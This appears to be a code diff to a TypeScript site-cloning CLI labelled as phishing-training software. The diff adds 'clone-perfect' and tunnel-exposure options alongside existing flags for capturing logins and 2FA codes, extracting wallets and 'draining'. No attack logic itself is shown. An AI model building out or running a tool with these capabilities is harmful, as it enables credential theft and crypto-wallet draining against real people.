@@ -202,6 +202,19 @@ import {
   type PlatformRouteConfig,
   type RouterResult,
 } from './lib/platform-router.js'
+import {
+  orchestrateClone,
+  analyzeComplexity,
+  getLevelDescription,
+  type OrchestratorResult,
+} from './lib/clone-perfect-orchestrator.js'
+import {
+  getTunnelRequirements,
+  getTunnelDocumentation,
+  validateTunnelConfig,
+  recommendTunnelMethod,
+  type TunnelConfig,
+} from './lib/clone-tunnel-orchestrator.js'
 
 const TRAINING_UA =
   'Legion-Phishing-Training-Bot/1.0 (authorized-internal; respects-robots; no-index)'
@@ -231,6 +244,7 @@ const FEATURE_FLAGS = [
   'solve-captcha',
   'preapprove',
   'mobile-optimize',
+  'clone-perfect',
 ] as const
 
 function parseCli(argv: string[]): {
@@ -262,6 +276,8 @@ function parseCli(argv: string[]): {
   extractWallets: boolean
   enableUniversalMode: boolean
   enableDraining: boolean
+  clonePerfect: boolean
+  enableCloneTunnels: boolean
   positional: string[]
 } {
   const features: TrainingCloneFeatures = {
@@ -303,11 +319,15 @@ function parseCli(argv: string[]): {
   let extractWallets = false
   let enableUniversalMode = false
   let enableDraining = false
+  let clonePerfect = false
+  let enableCloneTunnels = isTruthyEnv('ENABLE_CLONE_TUNNELS')
   const positional: string[] = []
 
   for (let i = 0; i < argv.length; i++) {
     const arg = argv[i]!
     if (arg === '--mirror') mirror = true
+    else if (arg === '--clone-perfect') clonePerfect = true
+    else if (arg === '--enable-tunnels') enableCloneTunnels = true
     else if (arg === '--extract-repo-components') extractRepoComponents = true
     else if (arg === '--capture-login') captureLogin = true
     else if (arg === '--capture-2fa') capture2FA = true
@@ -393,6 +413,8 @@ function parseCli(argv: string[]): {
     extractWallets,
     enableUniversalMode,
     enableDraining,
+    clonePerfect,
+    enableCloneTunnels,
     positional,
   }
 }
@@ -1371,6 +1393,8 @@ async function main(): Promise<void> {
     extractWallets,
     enableUniversalMode,
     enableDraining,
+    clonePerfect,
+    enableCloneTunnels,
     positional,
   } = parseCli(process.argv.slice(2))
 
